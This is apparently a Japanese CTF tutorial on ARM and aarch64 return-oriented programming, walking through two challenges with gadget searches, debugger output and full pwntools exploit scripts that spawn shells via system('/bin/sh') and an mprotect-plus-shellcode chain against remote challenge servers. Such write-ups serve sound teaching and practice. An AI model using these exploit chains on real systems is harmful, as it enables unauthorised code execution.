# Arm ROP

## はじめに
現時点では、arm や mips などのアーキテクチャで出題される pwn は比較的単純なスタックの脆弱性にとどまるため、ここでは arm の ROP のみを紹介します。その他の脆弱性の悪用については、今後順次紹介していきます。

## 予備知識
まず arm の関数呼び出し規約を確認します。関数の第1～第4引数は **r0 ～ r3** レジスタに格納され、残りの引数は右から左の順にスタックへ積まれます。スタックのバランスは呼び出された側(callee)が取り、関数の戻り値は **r0** に格納されます。

![](https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png)

このほか、arm では **b/bl** などの命令でジャンプを実現します。**pc** レジスタは x86 の eip に相当し、次の命令のアドレスを保持しています。これが私たちの制御目標でもあります。

## jarvisoj - typo
ここでは jarvisoj の typo という問題を例に説明します。問題は [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/arm/jarvisOJ_typo) からダウンロードできます。

### 保護の確認
```bash
jarvisOJ_typo [master●●] check ./typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
[*] '/home/m4x/pwn_repo/jarvisOJ_typo/typo'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8000)
```
静的リンクのプログラムで、スタックオーバーフロー保護も PIE も有効ではありません。静的リンクなので、バイナリ内に **system** などの危険な関数や **"/bin/sh"** などの重要な文字列を見つけられます。さらに No PIE なので、スタックオーバーフローだけで ropchain を構築して get shell できます。

### 悪用の方針
まずオーバーフローする箇所を見つける必要があります。プログラムを実行してみましょう。静的リンクなので、環境が整っていればそのまま実行できます。
```bash
jarvisOJ_typo [master●●] ./typo 
Let's Do Some Typing Exercise~
Press Enter to get start;
Input ~ if you want to quit

------Begin------
throng
throng

survive
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
qemu: uncaught target signal 11 (Segmentation fault) - core dumped
[1]    1172 segmentation fault  ./typo
```

プログラムの入力箇所は多くないので、オーバーフローする箇所はすぐに見つかります。

### ROP の構築
方針は明白で、スタックオーバーフローを利用して **system("/bin/sh")** を構築します。まず gadget を探します。
```bash
jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop"   
Gadgets information
============================================================
0x00020904 : pop {r0, r4, pc}
0x00068bec : pop {r1, pc}
0x00008160 : pop {r3, pc}
0x0000ab0c : pop {r3, r4, r5, pc}
0x0000a958 : pop {r3, r4, r5, r6, r7, pc}
0x00014a70 : pop {r3, r4, r7, pc}
0x000083b0 : pop {r4, pc}
0x00009284 : pop {r4, r5, pc}
0x000095b8 : pop {r4, r5, r6, pc}
0x000082e8 : pop {r4, r5, r6, r7, pc}
0x00023ed4 : pop {r4, r5, r7, pc}
0x00023dbc : pop {r4, r7, pc}
0x00014068 : pop {r7, pc}

Unique gadgets found: 13
```

制御したいのは第1引数だけなので、gadget として `pop {r0, r4, pc}` を選び、次のようなスタック構造を構築します。
```
+-------------+
|             |
|  padding    |
+-------------+
|  padding    | <- frame pointer
+-------------+ 
|gadgets_addr | <- return address
+-------------+
|binsh_addr   |
+-------------+
|junk_data    |
+-------------+
|system_addr  |
+-------------+
```

あとは padding の長さと、system および /bin/sh のアドレスが必要です。/bin/sh のアドレスは ROPgadget で見つかります。
```bash
jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
Strings information
============================================================
0x0006cb70 : /bin/sh
```
padding の長さは、pwntools の **cyclic** を使えば簡単に求められます。
```assembly
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────
 R0   0x0
 R1   0xfffef024 ◂— 0x61616161 ('aaaa')
 R2   0x7e
 R3   0x0
 R4   0x62616162 ('baab')
 R5   0x0
 R6   0x0
 R7   0x0
 R8   0x0
 R9   0xa5ec ◂— push   {r3, r4, r5, r6, r7, r8, sb, lr}
 R10  0xa68c ◂— push   {r3, r4, r5, lr}
 R11  0x62616163 ('caab')
 R12  0x0
 SP   0xfffef098 ◂— 0x62616165 ('eaab')
 PC   0x62616164 ('daab')
───────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────
Invalid address 0x62616164










────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ sp  0xfffef098 ◂— 0x62616165 ('eaab')
01:0004│     0xfffef09c ◂— 0x62616166 ('faab')
02:0008│     0xfffef0a0 ◂— 0x62616167 ('gaab')
03:000c│     0xfffef0a4 ◂— 0x62616168 ('haab')
04:0010│     0xfffef0a8 ◂— 0x62616169 ('iaab')
05:0014│     0xfffef0ac ◂— 0x6261616a ('jaab')
06:0018│     0xfffef0b0 ◂— 0x6261616b ('kaab')
07:001c│     0xfffef0b4 ◂— 0x6261616c ('laab')
Program received signal SIGSEGV
pwndbg> cyclic -l 0x62616164
112
```
したがって padding の長さは 112 です。
> あるいは、もっと力技で、スタックオーバーフローの長さをそのままブルートフォースしてもかまいません。

system のアドレスについては、このバイナリはシンボルテーブルが削除されているため、まず `rizzo` で一部のシンボルテーブルを復元します(シンボルテーブルの復元については、当面は参考リンクを見てください。今後順次紹介します)。rizzo はこのバイナリではあまりうまく復元できませんが、幸い、識別できたいくつかの関数の中にちょうど system が含まれていました。
```C
char *__fastcall system(int a1)
{
  char *result; // r0

  if ( a1 )
    result = sub_10BA8(a1);
  else
    result = (char *)(sub_10BA8((int)"exit 0") == 0);
  return result;
}
```
> あるいは、/bin/sh 文字列を検索して system 関数を探すこともできます。
## exp
条件がすべてそろったので、system("/bin/sh") を構築すれば完了です。
```
jarvisOJ_typo [master●●] cat solve.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
import pdb
#  context.log_level = "debug"

#  for i in range(100, 150)[::-1]:
for i in range(112, 123):
    if sys.argv[1] == "l":
        io = process("./typo", timeout = 2)
    elif sys.argv[1] == "d":
        io = process(["qemu-arm", "-g", "1234", "./typo"])
    else:
        io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)
    
    io.sendafter("quit\n", "\n")
    io.recvline()
    
    '''
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
    Strings information
    ============================================================
    0x0006c384 : /bin/sh
    jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
    0x00020904 : pop {r0, r4, pc}
    '''
    
    payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)
    success(i)
    io.sendlineafter("\n", payload)

    #  pause()
    try:
        #  pdb.set_trace()
        io.sendline("echo aaaa")
        io.recvuntil("aaaa", timeout = 1)
    except EOFError:
        io.close()
        continue
    else:
        io.interactive()
```

## 2018 上海市大学生ネットワークセキュリティコンテスト - baby_arm

### 静的解析

問題では `aarch64` アーキテクチャのファイルが与えられており、canary 保護は有効になっていません。
```bash
Shanghai2018_baby_arm [master] check ./pwn
+ file ./pwn
./pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped
+ checksec ./pwn
[*] '/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
プログラムのロジックを見てみます。
```C
__int64 main_logic()
{
  Init();
  write(1LL, "Name:", 5LL);
  read(0LL, input, 512LL);
  sub_4007F0();
  return 0LL;
}

void sub_4007F0()
{
  __int64 v0; // [xsp+10h] [xbp+10h]

  read(0LL, &v0, 512LL);
}
```
プログラムの本体は 512 文字をグローバル変数に読み込んでいます。さらに `sub_4007F0()` では、512 バイトをスタックに読み込んでいます。ここで注意すべきは、`frame pointer + 0x10` から直接読み込んでいる点で、そのため canary 保護が有効であっても関係ありません。

### 方針
方針を整理すると、そのまま rop できますが、リモートの libc のバージョンが分かりません。一方で、プログラム内に `mprotect` を呼び出すコード片があることにも気づきます。
```assembly
.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
.text:00000000004007CC                 MOV             X29, SP
.text:00000000004007D0                 MOV             W2, #0
.text:00000000004007D4                 MOV             X1, #0x1000
.text:00000000004007D8                 MOV             X0, #0x1000
.text:00000000004007DC                 MOVK            X0, #0x41,LSL#16
.text:00000000004007E0                 BL              .mprotect
.text:00000000004007E4                 NOP
.text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
.text:00000000004007EC                 RET
```
ただしこのコードは `mprotect` の権限ビットを 0 に設定しており、実行権限がありません。そこで、rop で `mprotect` を制御し、bss 領域などを書き込み可能かつ実行可能に設定する必要があります。

そこで、次のような方針が考えられます。

1. 最初に name を入力するときに、bss 領域に shellcode を書き込む
2. rop で mprotect を呼び出し、bss の権限を変更する
3. bss 上の shellcode にリターンする

`mprotect` は3つの引数を制御する必要があるので、[ret2csu](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu) のような方法を使うことが考えられます。次の gadget で `x0, x1, x2` レジスタを制御できます。
```assembly
.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
.text:00000000004008B0                 MOV             X2, X22
.text:00000000004008B4                 MOV             X1, X23
.text:00000000004008B8                 MOV             W0, W24
.text:00000000004008BC                 ADD             X19, X19, #1
.text:00000000004008C0                 BLR             X3
.text:00000000004008C4                 CMP             X19, X20
.text:00000000004008C8                 B.NE            loc_4008AC
.text:00000000004008CC
.text:00000000004008CC loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
.text:00000000004008DC                 RET
```

最終的な [exp](https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py) は次のとおりです。
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./pwn"
context.log_level = "debug"

if sys.argv[1] == "l":
    io = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
elif sys.argv[1] == "d":
    io = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
else:
    io = remote("106.75.126.171", 33865)

def csu_rop(call, x0, x1, x2):
    payload = flat(0x4008CC, '00000000', 0x4008ac, 0, 1, call)
    payload += flat(x2, x1, x0)
    payload += '22222222'
    return payload


if __name__ == "__main__":
    elf = ELF("./pwn", checksec = False)
    padding = asm('mov x0, x0')

    sc = asm(shellcraft.execve("/bin/sh"))
    #  print disasm(padding * 0x10 + sc)
    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)

    #  io.send(cyclic(length = 500, n = 8))
    #  rop = flat()
    payload = flat(cyclic(72), csu_rop(elf.got['read'], 0, elf.got['__gmon_start__'], 8))
    payload += flat(0x400824)
    io.send(payload)
    sleep(0.01)
    io.send(flat(elf.plt['mprotect']))
    sleep(0.01)

    raw_input("DEBUG: ")
    io.sendafter("Name:", padding * 0x10 + sc)
    sleep(0.01)

    payload = flat(cyclic(72), csu_rop(elf.got['__gmon_start__'], 0x411000, 0x1000, 7))
    payload += flat(0x411068)
    sleep(0.01)
    io.send(payload)

    io.interactive()
```

### 注意
また、`checksec` の検出結果では nx 保護が有効になっていますが、この検出結果は必ずしも正確ではありません。プログラムの nx 保護は qemu 起動時のオプション `-nx` で決まる場合もあるためです(たとえばこの問題は、リモートで失敗したときのエラーから、プログラムに nx 保護が有効であることが分かります)。古い qemu にはこのオプションがないことがあります。
```bash
Desktop ./qemu-aarch64 --version
qemu-aarch64 version 2.7.0, Copyright (c) 2003-2016 Fabrice Bellard and the QEMU Project developers
Desktop ./qemu-aarch64 -h| grep nx
-nx           QEMU_NX           enable NX implementation
```

次のようなエラーが出た場合は、aarch64 用のアセンブラがないということです。
```bash
[ERROR] Could not find 'as' installed for ContextType(arch = 'aarch64', binary = ELF('/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn'), bits = 64, endian = 'little', log_level = 10)
    Try installing binutils for this architecture:
    https://docs.pwntools.com/en/stable/install/binutils.html
```
公式ドキュメントの解決策を参照してください。
```bash
Shanghai2018_baby_arm [master●] apt search binutils| grep aarch64
p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, for aarch64-linux-gnu target
p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, for aarch64-linux-gnu target
p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)
p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, for aarch64-linux-gnu target (debug symbols)
Shanghai2018_baby_arm [master●] sudo apt install bintuils-aarch64-linux-gnu
```
> aarch64 のファイルは libc をインストールするときは `arm64` ですが、`binutils` をインストールするときは `aarch64` になります

## 例題
Codegate2015 - melong

## 参考文献

http://www.freebuf.com/articles/terminal/134980.html
